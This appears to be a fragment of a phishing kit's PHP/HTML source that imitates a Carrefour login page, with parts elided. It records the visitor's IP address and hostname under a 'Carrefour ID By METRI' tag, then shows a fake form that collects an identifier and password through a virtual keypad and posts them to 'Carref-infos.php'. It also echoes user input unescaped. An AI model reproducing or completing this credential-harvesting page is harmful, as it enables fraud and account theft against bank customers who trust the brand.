...
$hostname = gethostbyaddr($ip);
            $message = '/== Carrefour ID By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    ...
    <body style="background: #F0F0F0;">
        ...
        <div id="pass-wrapper">
            <div class="pass">
                ...
                <form action="<?php echo 'Carref-infos.php?token='.$token1; ?>" method="post">
                    <input type="hidden" name="captcha">
                    <input type="hidden" name="type" value="log">
                    <input type="text" name="id" id="identifiant" value="<?php  echo $_POST['id']; ?>" readonly="">
                    <input type="password" name="pwd" id="password" readonly="">
                    <div class="numbers">
                        <ul>
                            <li data-num="4">4</li>
                            <li data-num="7">7</li>
